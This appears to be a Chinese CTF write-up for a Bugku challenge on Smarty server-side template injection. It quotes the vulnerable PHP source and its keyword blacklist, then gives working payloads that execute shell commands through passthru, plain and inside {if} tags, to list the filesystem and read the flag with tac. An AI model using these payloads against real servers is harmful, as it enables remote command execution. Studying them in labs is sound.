SSTI
Smarty

题目地址：https://ctf.bugku.com/challenges/detail/id/198.html

题目信息

进入环境获得一句话提示： >pass a parameter and maybe the flag file's filename is random :>

随便给一个参数，得到如下界面：

将代码复制出来： 

<?php  
include('./libs/Smarty.class.php');  
echo "pass a parameter and maybe the flag file's filename is random :>";  
$smarty = new Smarty();  
if($_GET){ highlight_file('index.php');  
    foreach ($_GET AS $key => $value)  
    {  
        print $key."\n";  
        if(preg_match("/flag|\/flag/i", $value)){ $smarty->display('./template.html');  
  
  
        }elseif(preg_match("/system|readfile|gz|exec|eval|cat|assert|file|fgets/i", $value)){ $smarty->display('./template.html');              
              
        }else{ $smarty->display("eval:".$value);  
        }  
          
    }  
}  
?>

发现关键词smarty。

解题

本题已知模板引擎为SSTI，那么接下来就应该判断以下版本 

{$smarty.version}

版本为3.1。

那么Smarty模板注入中的常规利用、{literal}标签、静态方法都无法使用，那只能使用{if}标签和命令执行。

命令执行

查找flag的路径： 

?a={passthru('ls /')}

根据最开始的提示，flag的文件名是随机取得，因此判断红框就是flag文件。

接着需要读取flag（注意cat被过滤了）： 

?a={passthru('tac /_9764')}

{if}标签

其实和命令执行没什么不同。payload如下： 

1. ?a={if passthru('ls /')}{/if}
2. ?a={if passthru('tac /_9764')}{/if}
